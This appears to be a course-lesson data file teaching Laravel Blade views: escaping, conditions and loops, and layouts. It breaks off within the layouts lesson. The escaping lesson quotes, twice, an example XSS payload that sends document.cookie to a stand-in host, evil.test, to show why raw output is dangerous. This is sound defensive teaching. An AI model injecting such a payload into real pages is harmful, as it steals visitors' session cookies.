import type { LessonDay } from "@/lib/learn/lesson-types";

export const LARAVEL_DAY_7_LESSONS: LessonDay = {
  day: 7,
  title: "Views & Blade — layouts, components, slots & stacks",
  totalMinutes: 79,
  difficulty: "Beginner",
  lessons: [
    {
      id: "views-and-blade",
      title: "Views, and how Blade works",
      durationMinutes: 10,
      explanation: "Yesterday's controllers returned `view(...)` without much explanation. Today the view is the subject.\n\nA <b>view</b> (the file responsible for turning data into HTML) is where presentation lives. The split is simple:\n\n```text\nController  →  \"here is the data\"\nView        →  \"here is how it should look\"\n```\n\n<b>Blade</b> is Laravel's template engine: HTML with a small amount of extra syntax for variables, conditions and loops.\n\n---\n\n### 1. Basic — creating and returning one\n\nViews live in `resources/views/` and end in `.blade.php`:\n\n```bash\nphp artisan make:view invoices.index\n```\n\n```text\nresources/views/invoices/index.blade.php\n```\n\nThe name uses dots where the path uses slashes:\n\n```text\nresources/views/invoices/index.blade.php\n                 └──────┴─────┘\n                  invoices.index\n```\n\nReturn it from a controller, passing data as the second argument:\n\n```php\npublic function index()\n{\n    return view('invoices.index', [\n        'invoices' => $invoices,\n        'company'  => config('invoicing.company_name'),\n    ]);\n}\n```\n\nEach key becomes a variable in the template:\n\n```blade\n<h1>{{ $company }}</h1>\n\n<p>{{ count($invoices) }} invoices</p>\n```\n\nThree other ways to pass data exist, and you will see all of them:\n\n```php\nreturn view('invoices.index')->with('invoices', $invoices);\nreturn view('invoices.index', compact('invoices'));\nreturn view('invoices.index', ['invoices' => $invoices]);   // clearest\n```\n\nThe array form is worth preferring. `compact('invoices')` reads a variable by name, so renaming the local variable silently changes what the template receives.\n\n---\n\n### 2. Intermediate — Blade is compiled, not interpreted\n\nThis is the part that explains most of Blade's behaviour.\n\nBlade does not run as its own language. Laravel <b>compiles</b> each template into plain PHP, caches that file, and executes the cached PHP on later requests:\n\n```text\ninvoices/index.blade.php\n        ↓ compile (first request, or after an edit)\nstorage/framework/views/a3f9c2....php\n        ↓ execute\n      HTML\n```\n\nSo `{{ $name }}` becomes roughly `<?php echo e($name); ?>`, and `@if` becomes `<?php if (...): ?>`.\n\nTwo useful consequences:\n\nBlade costs almost nothing at runtime. After the first request it is ordinary PHP, so directives are not something to ration.\n\nAnd you can look at the compiled output when a template misbehaves. The files in `storage/framework/views/` are readable PHP, which turns \"why is this rendering oddly\" into a question you can answer directly.\n\nLaravel recompiles automatically when the source file changes. When it seems not to:\n\n```bash\nphp artisan view:clear\n```\n\n---\n\n### 3. Advanced — what belongs in a template\n\nThe temptation is to reach for the database from a view, because it is convenient:\n\n```blade\n{{-- Don't --}}\n@foreach (App\\Models\\Invoice::where('status', 'paid')->get() as $invoice)\n```\n\nTwo things go wrong. The query now runs during rendering, so it cannot be tested without rendering HTML, and it cannot be cached, reused or replaced. And inside a loop this is how you get dozens of unnoticed queries on one page.\n\nThe controller should hand over finished data:\n\n```php\nreturn view('invoices.index', ['invoices' => $this->invoices->paid()]);\n```\n\nA workable line: a template may <b>read</b> data and decide how to display it. It should not <b>fetch</b> data or decide what the data means.\n\n```text\nFine in a template            Belongs in the controller\n──────────────────            ─────────────────────────\nloop over what you were given  running the query\nformat a date for display      deciding which records to show\nshow a badge if status is paid  calculating the totals\nchoose a CSS class             deciding whether the user may see it\n```\n\nThe practical test is the same one from Day 6: if the answer would be the same for an API response with no HTML at all, it is not presentation.",
      diagram: `Controller decides, view displays

  Controller                          View
  ──────────                          ────
  fetch the invoices        →         loop over them
  calculate the totals      →         format them for display
  decide who may see them   →         choose a CSS class

  return view('invoices.index', ['invoices' => $invoices]);
                    │                    │
              file to render        becomes $invoices


Naming: slashes become dots

  resources/views/invoices/index.blade.php
                   └──────┴─────┘
                    invoices.index


Blade is COMPILED, not interpreted

  invoices/index.blade.php
          ↓  compile (first request, or after an edit)
  storage/framework/views/a3f9c2....php     ← readable PHP
          ↓  execute
        HTML

  {{ $name }}  →  <?php echo e($name); ?>
  @if (...)    →  <?php if (...): ?>

  So directives cost nothing at runtime, and you can
  open the compiled file when a template misbehaves.
  Stuck on an old version? php artisan view:clear`,
      codeExample: {
        title: "Rendering a view, and what not to put in it",
        code: `<?php
// app/Http/Controllers/InvoiceController.php

class InvoiceController extends Controller
{
    public function index()
    {
        // The array form is clearest: renaming the local variable
        // cannot silently change what the template receives.
        return view('invoices.index', [
            'invoices' => $this->invoices->all(),
            'company'  => config('invoicing.company_name'),
        ]);

        // Also valid:
        // return view('invoices.index')->with('invoices', $invoices);
        // return view('invoices.index', compact('invoices'));
    }
}
?>

{{-- resources/views/invoices/index.blade.php --}}

<h1>{{ $company }}</h1>

<p>{{ count($invoices) }} invoices</p>

@foreach ($invoices as $invoice)
    <p>{{ $invoice['number'] }}</p>
@endforeach


{{-- ---------- Don't do this ---------- --}}
{{-- The query runs during rendering: untestable without HTML,
     impossible to cache or reuse, and inside a loop it becomes
     dozens of queries nobody notices. --}}
@foreach (App\\Models\\Invoice::where('status', 'paid')->get() as $invoice)
    <p>{{ $invoice->number }}</p>
@endforeach


{{-- ---------- Do this instead ---------- --}}
{{-- Controller: view('invoices.index', ['paid' => $this->invoices->paid()]) --}}
@foreach ($paid as $invoice)
    <p>{{ $invoice['number'] }}</p>
@endforeach


{{-- A Blade comment. Unlike an HTML comment, it does not
     reach the browser, so it is safe for notes to yourself. --}}
<!-- An HTML comment DOES reach the browser. -->`,
      },
      keyTakeaways: [
        "A <b>view</b> turns data into HTML; the controller decides what that data is.",
        "Views live in `resources/views/` and are named with dots: `invoices.index`.",
        "Pass data as an array second argument; <b>prefer it over `compact()`</b>, which depends on a variable name.",
        "Blade is <b>compiled to plain PHP</b> and cached, so `{{ }}` becomes `echo e(...)` and directives cost nothing at runtime.",
        "The compiled files in `storage/framework/views/` are readable, which makes odd rendering debuggable.",
        "`php artisan view:clear` when a stale compiled view is being served.",
        "A template may <b>read</b> data and decide how to show it; it should not <b>fetch</b> data.",
        "`{{-- --}}` is a Blade comment and never reaches the browser, unlike an HTML comment.",
      ],
      commonMistakes: [
        "<b>Querying the database from a template.</b> It cannot be tested without rendering HTML, and inside a loop it silently becomes dozens of queries.",
        "<b>Using `compact('invoices')` then renaming the local variable.</b> The template loses its data with no error at the point of the change.",
        "<b>Putting a secret in an HTML comment.</b> It is sent to the browser. Blade comments are not.",
        "<b>Expecting a stale view to refresh itself.</b> Usually it does, and when it does not, `view:clear` is the answer.",
        "<b>Forgetting `.blade.php`.</b> A file named `index.php` in the views directory is not compiled by Blade at all.",
      ],
      quiz: [
        {
          question: "How do you refer to `resources/views/invoices/index.blade.php`?",
          options: [
            "`invoices.index`",
            "`invoices/index`",
            "`views.invoices.index`",
            "`index.blade.php`",
          ],
          correctIndex: 0,
          explanation: "Slashes in the path become dots in the name.",
        },
        {
          question: "What does Laravel do with a Blade template?",
          options: [
            "Interprets it on every request",
            "Converts it to JavaScript",
            "Sends it to the browser as-is",
            "Compiles it to plain PHP and caches the result",
          ],
          correctIndex: 3,
          explanation: "Which is why directives cost essentially nothing at runtime.",
        },
        {
          question: "Why prefer an array over `compact()` when passing data?",
          options: [
            "It is faster",
            "`compact()` is deprecated",
            "`compact()` depends on the local variable name, so renaming it silently breaks the view",
            "Arrays allow more data",
          ],
          correctIndex: 2,
          explanation: "The failure appears in the template, far from the rename that caused it.",
        },
        {
          question: "Which of these belongs in a controller rather than a template?",
          options: [
            "Running the query that fetches the invoices",
            "Choosing a CSS class from a status",
            "Looping over invoices",
            "Formatting a date",
          ],
          correctIndex: 0,
          explanation: "A template may read data and decide how to show it, not fetch it.",
        },
      ],
    },
    {
      id: "echoing-and-escaping",
      title: "Echoing data, escaping and XSS",
      durationMinutes: 10,
      explanation: "The most common thing you write in Blade is also the most security-relevant.\n\n<b>Escaping</b> means converting characters like `<` and `>` so the browser shows them as text instead of running them as markup. <b>XSS</b> (cross-site scripting) is what escaping prevents: someone getting their own JavaScript to run on your page by hiding it in data your template prints.\n\n---\n\n### 1. Basic — the two ways to print\n\n```blade\n{{ $name }}      {{-- escaped --}}\n{!! $html !!}    {{-- raw --}}\n```\n\n`{{ }}` runs the value through `htmlspecialchars` before printing. So if `$name` holds:\n\n```php\n$name = '<strong>Acme</strong>';\n```\n\nthen `{{ $name }}` displays the literal text `<strong>Acme</strong>` on the page, tags and all, rather than bold text.\n\n`{!! !!}` prints it untouched, so the browser treats it as real HTML.\n\n```text\n{{ $html }}     →  &lt;strong&gt;Acme&lt;/strong&gt;   text on the page\n{!! $html !!}   →  <strong>Acme</strong>             actual markup\n```\n\n---\n\n### 2. Intermediate — why escaping is the default\n\nImagine a client name field. Someone enters:\n\n```text\n<script>fetch('https://evil.test?c='+document.cookie)</script>\n```\n\nYou save it and later display it on the invoice page.\n\nWith `{{ }}`, the visitor sees that text printed on screen. Odd-looking, harmless.\n\nWith `{!! !!}`, the browser executes it. Every user who opens that invoice sends their session cookie to someone else's server. That is <b>XSS</b> (cross-site scripting: injecting code into a page other people view), and it is the mistake `{{ }}` exists to prevent.\n\nThe rule is short:\n\n```text\nUse {{ }} always.\nUse {!! !!} only for HTML you generated yourself.\nNever use {!! !!} on anything a user typed.\n```\n\n\"Anything a user typed\" includes more than it seems: names, invoice descriptions, notes, filenames, data imported from a CSV, values from a third-party API. If it did not come from your own code, it is untrusted.\n\nWhen you genuinely need user-supplied rich text, sanitise it through a purifier library first, then print the cleaned result. Sanitise on the way in or at render time, but never simply trust it.\n\n---\n\n### 3. Advanced — escaping is context-sensitive\n\n`{{ }}` escapes for <b>HTML</b>. That is the right thing between tags and inside attributes, but not everywhere.\n\nInside a `<script>` block, HTML escaping is the wrong tool:\n\n```blade\n{{-- Wrong --}}\n<script>\n    const client = \"{{ $client }}\";\n</script>\n```\n\nA name containing a quote or a backslash breaks your JavaScript, and a carefully chosen value can escape the string entirely.\n\nUse `@json`, which encodes for JavaScript:\n\n```blade\n<script>\n    const client = @json($client);\n    const invoice = @json($invoice);\n</script>\n```\n\nIt handles quotes, arrays and objects correctly, and no surrounding quotes are needed.\n\nOne more piece of syntax. If you use a front-end framework that also writes `{{ }}`, prefix it with `@` so Blade leaves it alone:\n\n```blade\n@{{ message }}      {{-- Blade prints: {{ message }} --}}\n```\n\nFor a whole block, `@verbatim`:\n\n```blade\n@verbatim\n    <div id=\"app\">{{ message }}</div>\n@endverbatim\n```\n\nAnd two small conveniences:\n\n```blade\n{{ $invoice['note'] ?? 'No note' }}    {{-- plain PHP null coalescing --}}\n```\n\nBlade also supports `{{ $x or 'default' }}` in some older material; `??` is the current form and the one to use.",
      diagram: `The two echoes

  $name = '<script>steal()</script>'

  {{ $name }}       →  printed as text on the page      harmless
  {!! $name !!}     →  the browser RUNS it              XSS

  {{ }} escapes for HTML. That is why it is the default.


What counts as untrusted

  typed by a user        an invoice note, a client name
  imported               a CSV column, a spreadsheet
  from an API            a third party's field
  a filename             uploaded by anyone

  If it did not come from your own code, use {{ }}.


Escaping is CONTEXT-sensitive

  Between tags        {{ $client }}       ✓ HTML escaping
  In an attribute     "{{ $client }}"     ✓ HTML escaping
  Inside <script>     "{{ $client }}"     ✗ WRONG TOOL
                      @json($client)      ✓ encoded for JavaScript

  A name with a quote breaks the JS; a crafted one escapes the string.


Leaving {{ }} for a JS framework

  @{{ message }}          one expression
  @verbatim ... @endverbatim   a whole block`,
      codeExample: {
        title: "Escaped, raw, and JavaScript",
        code: `{{-- resources/views/invoices/show.blade.php --}}

{{-- ---------- The default: always escaped ---------- --}}
<h1>{{ $invoice['client'] }}</h1>
<p>{{ $invoice['note'] ?? 'No note' }}</p>

{{-- Safe in attributes too --}}
<a href="{{ route('invoices.show', $invoice['number']) }}"
   title="{{ $invoice['client'] }}">View</a>


{{-- ---------- Raw: only for HTML YOU generated ---------- --}}
{{-- Fine: this string is built by your own code. --}}
{!! $renderedInvoiceTable !!}

{{-- NEVER. If a client name is
     <script>fetch('https://evil.test?c='+document.cookie)</script>
     then every visitor to this page sends their session cookie away. --}}
{!! $invoice['client'] !!}


{{-- ---------- Passing data to JavaScript ---------- --}}

{{-- Wrong: {{ }} escapes for HTML, not for JS. A quote or a
     backslash in the name breaks the script or escapes the string. --}}
<script>
    const client = "{{ $invoice['client'] }}";
</script>

{{-- Right: @json encodes for JavaScript, quotes included. --}}
<script>
    const client  = @json($invoice['client']);
    const invoice = @json($invoice);
    const lines   = @json($invoice['lines']);
</script>


{{-- ---------- Leaving {{ }} alone for a JS framework ---------- --}}
<div id="app">
    @{{ message }}
</div>

@verbatim
    <div id="vue-app">
        {{ message }}
        {{ count }}
    </div>
@endverbatim


{{-- ---------- Comments ---------- --}}
{{-- Blade comment: compiled away, never sent to the browser. --}}
<!-- HTML comment: the visitor can read this in view-source. -->`,
      },
      keyTakeaways: [
        "<b>`{{ }}` escapes</b> for HTML and is what you should use for essentially everything.",
        "<b>`{!! !!}` prints raw HTML</b> and is only safe for markup your own code produced.",
        "Printing user input raw is <b>XSS</b>: the browser runs whatever they typed, for every visitor.",
        "Untrusted means anything not written by your code: names, notes, CSV imports, API fields, filenames.",
        "Escaping is <b>context-sensitive</b>. `{{ }}` is for HTML; inside `<script>` it is the wrong tool.",
        "<b>`@json($value)`</b> encodes correctly for JavaScript, including quotes, arrays and objects.",
        "`@{{ }}` and `@verbatim` leave braces alone for a front-end framework.",
        "`{{-- --}}` is compiled away; an HTML comment is visible in view-source.",
      ],
      commonMistakes: [
        "<b>Using `{!! !!}` to make some HTML in a database field render.</b> That field is exactly the attack surface XSS uses.",
        "<b>Writing `\"{{ $value }}\"` inside a `<script>` block.</b> HTML escaping does not make a value safe as JavaScript. Use `@json`.",
        "<b>Assuming imported data is trusted.</b> A CSV column or an API field is as untrusted as a form input.",
        "<b>Sanitising with `strip_tags` and calling it safe.</b> Use a real purifier if you must accept rich text.",
        "<b>Putting anything sensitive in an HTML comment.</b> It is delivered to the browser and readable in view-source.",
      ],
      quiz: [
        {
          question: "What is the difference between `{{ }}` and `{!! !!}`?",
          options: [
            "`{!! !!}` is faster",
            "`{{ }}` only works with strings",
            "`{{ }}` escapes HTML; `{!! !!}` prints it raw",
            "There is none",
          ],
          correctIndex: 2,
          explanation: "Escaping is what stops a user's input being executed as markup.",
        },
        {
          question: "Why is `{!! $userInput !!}` dangerous?",
          options: [
            "The browser executes any script the user typed, for every visitor",
            "It breaks caching",
            "It is slower",
            "It escapes twice",
          ],
          correctIndex: 0,
          explanation: "That is cross-site scripting, and it is why escaping is the default.",
        },
        {
          question: "How should you pass a PHP value into a `<script>` block?",
          options: [
            "`@json($value)`",
            "`\"{{ $value }}\"`",
            "`{!! $value !!}`",
            "`{{-- $value --}}`",
          ],
          correctIndex: 0,
          explanation: "`{{ }}` escapes for HTML, which is the wrong encoding inside JavaScript.",
        },
        {
          question: "What does `@{{ message }}` do?",
          options: [
            "Escapes twice",
            "Prints an empty string",
            "Tells Blade to leave the braces alone for a JS framework",
            "Runs PHP",
          ],
          correctIndex: 2,
          explanation: "`@verbatim` does the same for a whole block.",
        },
      ],
    },
    {
      id: "conditions-and-loops",
      title: "Conditions, loops and $loop",
      durationMinutes: 12,
      explanation: "Blade's control structures are the same PHP ones with tidier syntax.\n\nA <b>directive</b> is a Blade instruction starting with `@`, like `@if` or `@foreach`, which compiles down to plain PHP. <b>`$loop`</b> is a variable Blade makes available inside every `@foreach`, describing where you are in the loop: which iteration you are on, whether it is the first or last, how many are left.\n\n---\n\n### 1. Basic — conditions\n\n```blade\n@if ($invoice['status'] === 'paid')\n    <span class=\"badge\">Paid</span>\n@elseif ($invoice['status'] === 'sent')\n    <span class=\"badge\">Awaiting payment</span>\n@else\n    <span class=\"badge\">Draft</span>\n@endif\n```\n\n`@unless` reads better than `@if (! ...)` when there is no else branch:\n\n```blade\n@unless ($invoice['status'] === 'paid')\n    <button>Pay now</button>\n@endunless\n```\n\nTwo checks that are not the same thing:\n\n```blade\n@isset($invoice['note'])     {{-- set and not null --}}\n@empty($invoices)            {{-- missing, null, empty array, 0 or \"\" --}}\n```\n\n`@empty($invoices)` is true for an empty array <i>and</i> for the number zero, which occasionally surprises people.\n\nAuthentication has its own pair, which you will use constantly:\n\n```blade\n@auth\n    <a href=\"{{ route('invoices.index') }}\">My invoices</a>\n@endauth\n\n@guest\n    <a href=\"{{ route('login') }}\">Log in</a>\n@endguest\n```\n\nAnd environment checks, useful for debug output:\n\n```blade\n@production\n    <script src=\"/analytics.js\"></script>\n@endproduction\n\n@env(['local', 'testing'])\n    <p>Environment: {{ app()->environment() }}</p>\n@endenv\n```\n\n---\n\n### 2. Intermediate — loops, and the one worth defaulting to\n\n```blade\n@foreach ($invoices as $invoice)\n    <tr><td>{{ $invoice['number'] }}</td></tr>\n@endforeach\n```\n\n<b>`@forelse` is usually the better default.</b> It handles the empty case in the same structure:\n\n```blade\n@forelse ($invoices as $invoice)\n    <tr><td>{{ $invoice['number'] }}</td></tr>\n@empty\n    <tr><td>No invoices yet.</td></tr>\n@endforelse\n```\n\nReaching for `@foreach` and forgetting the empty case is how a page ends up showing a table header above nothing, with no explanation for the user. `@forelse` makes the empty state impossible to skip, because it is part of the same block.\n\n`@for` and `@while` exist and are rarely what you want in a template. If you are incrementing a counter in Blade, the data probably needed shaping in the controller.\n\nTwo loop controls:\n\n```blade\n@foreach ($invoices as $invoice)\n    @continue($invoice['status'] === 'draft')     {{-- skip this one --}}\n    @break($loop->iteration > 10)                 {{-- stop entirely --}}\n\n    <tr><td>{{ $invoice['number'] }}</td></tr>\n@endforeach\n```\n\n---\n\n### 3. Advanced — the `$loop` variable\n\nInside any Blade loop, `$loop` is available for free:\n\n```text\n$loop->index        0-based position\n$loop->iteration    1-based position\n$loop->first        is this the first?\n$loop->last         is this the last?\n$loop->even / odd\n$loop->count        total items\n$loop->remaining    how many after this one\n$loop->depth        nesting level\n$loop->parent       the outer loop's $loop\n```\n\nThe two that earn their keep:\n\n```blade\n@foreach ($lines as $line)\n    {{ $line['description'] }}@if (! $loop->last), @endif\n@endforeach\n```\n\nThat prints `A, B, C` with no trailing comma, which otherwise needs a counter and an `if`.\n\n```blade\n<tr class=\"{{ $loop->even ? 'bg-gray-50' : '' }}\">\n```\n\nZebra striping with no counter at all.\n\n`$loop->parent` handles nesting, which is otherwise fiddly:\n\n```blade\n@foreach ($invoices as $invoice)\n    @foreach ($invoice['lines'] as $line)\n        Invoice {{ $loop->parent->iteration }}, line {{ $loop->iteration }}\n    @endforeach\n@endforeach\n```\n\nOne caution worth stating plainly. `$loop` is only available inside Blade's own loop directives. Write a raw `@php foreach (...) @endphp` loop and there is no `$loop`, which is one of several small reasons to stay with the directives.\n\nAnd `@php` blocks in general: they work, and a long one is a sign that the controller should have prepared the data.",
      diagram: `@foreach vs @forelse

  @foreach                        @forelse
  loop the rows                   loop the rows
  ...                             @empty
  @endforeach                       "No invoices yet."
                                  @endforelse
  Empty list?
  → header above nothing,         Empty list?
    with no explanation           → a real message, and you
                                    cannot forget to write it

  Default to @forelse.


$loop, free inside every Blade loop

  index      0-based        first     is this the first?
  iteration  1-based        last      is this the last?
  count      total          even/odd  for striping
  remaining  after this     parent    the outer loop's $loop


  The comma problem, solved

  @foreach ($lines as $line)
      {{ $line['description'] }}@if (! $loop->last), @endif
  @endforeach
                    ↓
              A, B, C          no trailing comma, no counter


  $loop exists ONLY inside Blade loop directives.
  A raw @php foreach (...) has no $loop.`,
      codeExample: {
        title: "Conditions, loops and $loop in one page",
        code: `{{-- resources/views/invoices/index.blade.php --}}

{{-- ---------- Auth-aware navigation ---------- --}}
@auth
    <a href="{{ route('invoices.index') }}">My invoices</a>
@endauth

@guest
    <a href="{{ route('login') }}">Log in</a>
@endguest


{{-- ---------- The table ---------- --}}
<table>
    <thead>
        <tr><th>Number</th><th>Client</th><th>Status</th></tr>
    </thead>
    <tbody>
        {{-- @forelse, so the empty case cannot be forgotten --}}
        @forelse ($invoices as $invoice)

            {{-- Skip drafts without breaking the loop --}}
            @continue($invoice['status'] === 'draft')

            {{-- $loop->even gives zebra striping with no counter --}}
            <tr class="{{ $loop->even ? 'bg-gray-50' : '' }}">
                <td>{{ $loop->iteration }}. {{ $invoice['number'] }}</td>
                <td>{{ $invoice['client'] }}</td>
                <td>
                    @if ($invoice['status'] === 'paid')
                        <span class="badge badge-green">Paid</span>
                    @elseif ($invoice['status'] === 'sent')
                        <span class="badge">Awaiting payment</span>
                    @else
                        <span class="badge badge-grey">Draft</span>
                    @endif
                </td>
                <td>
                    @unless ($invoice['status'] === 'paid')
                        <button>Pay now</button>
                    @endunless
                </td>
            </tr>

        @empty
            <tr><td colspan="4">No invoices yet.</td></tr>
        @endforelse
    </tbody>
</table>


{{-- ---------- Joining without a trailing comma ---------- --}}
<p>
    Lines:
    @foreach ($invoice['lines'] as $line)
        {{ $line['description'] }}@if (! $loop->last), @endif
    @endforeach
</p>


{{-- ---------- Nested loops: $loop->parent ---------- --}}
@foreach ($invoices as $invoice)
    @foreach ($invoice['lines'] as $line)
        <p>Invoice {{ $loop->parent->iteration }}, line {{ $loop->iteration }}</p>
    @endforeach
@endforeach


{{-- ---------- Presence checks (these differ) ---------- --}}
@isset($invoice['note'])
    <p>{{ $invoice['note'] }}</p>
@endisset

@empty($invoices)
    <p>Nothing to show.</p>
@endempty


{{-- ---------- Environment ---------- --}}
@production
    <script src="/analytics.js"></script>
@endproduction

@env(['local', 'testing'])
    <p>Environment: {{ app()->environment() }}</p>
@endenv`,
      },
      keyTakeaways: [
        "`@if` / `@elseif` / `@else` are the PHP equivalents with tidier syntax; `@unless` reads better than `@if (! ...)`.",
        "<b>Default to `@forelse`</b>, because it makes the empty state part of the same block instead of something to remember.",
        "`@isset` checks set and not null; `@empty` is also true for `0` and `\"\"`.",
        "<b>`@auth` and `@guest`</b> handle logged-in and logged-out sections.",
        "`@continue` and `@break` accept a condition inline: `@continue($x)`.",
        "<b>`$loop`</b> is free inside every Blade loop: `iteration`, `first`, `last`, `even`, `count`, `remaining`, `parent`.",
        "`$loop->last` solves the trailing-comma problem; `$loop->even` gives zebra striping with no counter.",
        "`$loop` only exists inside Blade's loop directives, not a raw `@php foreach`.",
      ],
      commonMistakes: [
        "<b>Using `@foreach` and forgetting the empty case.</b> The page shows a table header above nothing and the user cannot tell whether it is broken.",
        "<b>Expecting `$loop` in a `@php foreach` block.</b> It is provided by the Blade directives only.",
        "<b>Using `@empty($x)` to mean \"not set\".</b> It is also true for `0` and `\"\"`, which is rarely what you meant.",
        "<b>Counting manually with `$i++` in a template.</b> `$loop->iteration` already exists.",
        "<b>Writing long `@php` blocks.</b> If a template needs that much logic, the controller should have prepared the data.",
      ],
      quiz: [
        {
          question: "Why default to `@forelse` over `@foreach`?",
          options: [
            "It is faster",
            "The empty case is part of the same block, so it cannot be forgotten",
            "`@foreach` cannot use `$loop`",
            "It handles nesting better",
          ],
          correctIndex: 1,
          explanation: "Otherwise an empty list renders a header above nothing.",
        },
        {
          question: "What does `$loop->last` help you avoid?",
          options: [
            "Extra queries",
            "Escaping issues",
            "Nested loops",
            "A trailing comma when joining items",
          ],
          correctIndex: 3,
          explanation: "`{{ $x }}@if (! $loop->last), @endif` prints A, B, C cleanly.",
        },
        {
          question: "Where is `$loop` available?",
          options: [
            "Anywhere in a Blade file",
            "Only inside Blade's loop directives",
            "Only in components",
            "Only in the first loop",
          ],
          correctIndex: 1,
          explanation: "A raw `@php foreach (...)` block has no `$loop`.",
        },
        {
          question: "What is true of `@empty($invoices)` that surprises people?",
          options: [
            "It only works on arrays",
            "It requires a closing tag",
            "It is also true for `0` and `\"\"`",
            "It queries the database",
          ],
          correctIndex: 2,
          explanation: "`@isset` is the check for set and not null.",
        },
      ],
    },
    {
      id: "layouts",
      title: "Layouts: inheritance and component layouts",
      durationMinutes: 11,
      explanation: "Every page shares a shell: the doctype, the head, the navigation, the footer. You write it once.\n\nA <b>layout</b> is that shared shell: doctype, head, navigation, footer, written once and reused by every page.\n\nBlade offers two ways, and they are genuinely different in feel. With <b>template inheritance</b>, a child view extends a parent and fills in named <b>sections</b>. With a <b>component layout</b>, the shell is a component and the page is passed into it as a slot.\n\n---\n\n### 1. Basic — template inheritance\n\nThe layout defines holes with `@yield`:\n\n```blade\n{{-- resources/views/layouts/app.blade.php --}}\n<!DOCTYPE html>\n<html>\n<head>\n    <title>@yield('title', 'InvoiceHub')</title>\n</head>\n<body>\n    <header>InvoiceHub</header>\n\n    <main>\n        @yield('content')\n    </main>\n</body>\n</html>\n```\n\nThe page fills them with `@section`:\n\n```blade\n@extends('layouts.app')\n\n@section('title', 'Invoices')\n\n@section('content')\n    <h1>Invoices</h1>\n@endsection\n```\n\n```text\nlayouts/app.blade.php\n        ↑ @extends\ninvoices/index.blade.php\n        ↓\n    final HTML\n```\n\nTwo details. `@yield('title', 'InvoiceHub')` takes a default for pages that do not set it. And `@section('title', 'Invoices')` has a one-line form when the content is a single value.\n\n`@parent` keeps the layout's version and adds to it:\n\n```blade\n@section('sidebar')\n    @parent\n    <p>Invoice filters</p>\n@endsection\n```\n\n---\n\n### 2. Intermediate — component layouts\n\nThe newer approach treats the layout as a component. The layout receives content through `$slot`:\n\n```blade\n{{-- resources/views/components/layout.blade.php --}}\n<!DOCTYPE html>\n<html>\n<head>\n    <title>{{ $title ?? 'InvoiceHub' }}</title>\n</head>\n<body>\n    <header>InvoiceHub</header>\n\n    <main>\n        {{ $slot }}\n    </main>\n</body>\n</html>\n```\n\nThe page wraps itself in it:\n\n```blade\n<x-layout title=\"Invoices\">\n    <h1>Invoices</h1>\n</x-layout>\n```\n\nThe difference in mental model is the interesting part:\n\n```text\nINHERITANCE                    COMPONENT\nthe child says                 the child says\n\"I am inside this layout\"      \"wrap me in this layout\"\n\nthe layout pulls               the page pushes\ncontent from named sections    content into a slot\n```\n\nPractically:\n\n```text\n@extends          <x-layout>\n─────────         ──────────\nseveral named     one main slot, plus named slots\n  sections          when you need more\n@parent for       plain PHP defaults: $title ?? '...'\n  additive bits\none layout per    layouts nest naturally, like any\n  page              other component\n```\n\nNeither is deprecated. Both appear in the current documentation.\n\n---\n\n### 3. Advanced — choosing, and not mixing\n\nA reasonable rule: if your application already uses Blade components for buttons, cards and alerts, use a component layout so there is one system rather than two. If you are maintaining something built on `@extends`, leave it alone; converting a working layout buys nothing.\n\nWhat you should avoid is <b>mixing them in one page</b>. A template that both `@extends` a layout and wraps parts in `<x-layout>` is confusing to follow and easy to get subtly wrong.\n\nTwo things people expect to work and which do not:\n\n<b>Sections do not work inside components.</b> `@section` belongs to the inheritance system. Inside a component layout, use named slots instead:\n\n```blade\n<x-layout>\n    <x-slot:header>\n        <h1>Invoices</h1>\n    </x-slot:header>\n\n    <p>The main content.</p>\n</x-layout>\n```\n\n<b>`@yield` returns a string, it does not delay rendering.</b> Anything you put in a `@section` is rendered at that point, so a section is not a way to defer expensive work.\n\nFor scripts and styles a page needs, neither layout style is the answer. That is what stacks are for, and they arrive in the lesson after next.",
      diagram: `Two ways to share a shell

INHERITANCE                        COMPONENT
layouts/app.blade.php              components/layout.blade.php
  @yield('title')                    {{ $title ?? 'InvoiceHub' }}
  @yield('content')                  {{ $slot }}
        ↑                                  ↑
  @extends('layouts.app')            <x-layout title="Invoices">
  @section('title', 'Invoices')          <h1>Invoices</h1>
  @section('content') ... @endsection  </x-layout>

  the child declares its parent      the child wraps itself
  the layout PULLS from sections     the page PUSHES into a slot


Choosing

  Already using Blade components?     → component layout
    (buttons, cards, alerts)             one system, not two

  Maintaining an @extends codebase?   → leave it
                                         converting buys nothing

  Never mix both in one page.


What does not carry across

  @section inside a component   ✗   use named slots instead
  @yield to defer work          ✗   it renders immediately

  Page-specific scripts and styles belong in
  neither: that is what @stack is for.`,
      codeExample: {
        title: "The same page, both layout styles",
        code: `{{-- ============ INHERITANCE ============ --}}

{{-- resources/views/layouts/app.blade.php --}}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>@yield('title', 'InvoiceHub')</title>
    @stack('styles')
</head>
<body>
    <header>
        <a href="{{ route('invoices.index') }}">InvoiceHub</a>
    </header>

    <main>
        @yield('content')
    </main>

    @section('sidebar')
        <p>Default sidebar</p>
    @endsection

    <footer>&copy; {{ date('Y') }}</footer>
    @stack('scripts')
</body>
</html>


{{-- resources/views/invoices/index.blade.php --}}
@extends('layouts.app')

{{-- One-line form, for a single value --}}
@section('title', 'Invoices')

@section('sidebar')
    @parent                       {{-- keep the layout's version, add to it --}}
    <p>Invoice filters</p>
@endsection

@section('content')
    <h1>Invoices</h1>
@endsection


{{-- ============ COMPONENT LAYOUT ============ --}}

{{-- resources/views/components/layout.blade.php --}}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    {{-- Plain PHP defaults, no @yield needed --}}
    <title>{{ $title ?? 'InvoiceHub' }}</title>
    @stack('styles')
</head>
<body>
    <header>
        <a href="{{ route('invoices.index') }}">InvoiceHub</a>
    </header>

    {{-- A named slot, with a fallback if the page does not supply one --}}
    @isset($header)
        <div class="page-header">{{ $header }}</div>
    @endisset

    <main>
        {{ $slot }}
    </main>

    <footer>&copy; {{ date('Y') }}</footer>
    @stack('scripts')
</body>
</html>


{{-- resources/views/invoices/index.blade.php --}}
<x-layout title="Invoices">
    <x-slot:header>
        <h1>Invoices</h1>
    </x-slot:header>

    <table>
        {{-- ... --}}
    </table>
</x-layout>


{{-- Do NOT do both in one page. --}}`,
      },
      keyTakeaways: [
        "<b>Inheritance</b>: the layout declares `@yield` holes and the page fills them with `@section`.",
        "`@yield('title', 'Default')` takes a fallback; `@section('title', 'Invoices')` has a one-line form.",
        "<b>`@parent`</b> keeps the layout's version of a section and appends to it.",
        "<b>Component layouts</b>: the page wraps itself in `<x-layout>` and content arrives as `$slot`.",
